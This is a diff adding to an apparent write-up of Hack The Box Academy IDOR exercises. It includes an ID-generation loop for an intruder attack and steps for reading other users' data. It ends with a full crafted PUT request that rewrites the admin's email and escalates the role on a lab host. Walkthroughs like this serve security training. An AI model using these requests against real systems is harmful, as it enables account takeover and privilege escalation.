@@ -91,4 +91,32 @@ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 
 >URL Encode the characters of the payload for the intruder attack above.  
 
->
+>[IDOR in Insecure APIs](https://academy.hackthebox.com/module/134/section/1201) Try to read the details of the user with 'uid=5'. What is their 'uuid' value?  
+
+>Intercept `Update Profile` request in Burp.  
+
+![web-attack-IDOR-apis](/images/web-attack-IDOR-apis.png)  
+
+>[Chaining IDOR Vulnerabilities](https://academy.hackthebox.com/module/134/section/1200) - Change the admin's email to `flag@idor.htb`, and you should get the flag on the 'edit profile' page.
+
+![web-attack-Chaining-IDOR-Vulnerabilities](/images/web-attack-Chaining-IDOR-Vulnerabilities.png)  
+
+>Create new `PUT` request with the information from the GET request above, and replace JSON field value of email.  
+
+```HTML
+PUT /profile/api.php/profile/10 HTTP/1.1
+Host: 94.237.56.76:38781
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/json
+Content-Length: 179
+Connection: close
+Cookie: role=employee
+
+{
+ "uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"
+}
+```  
+
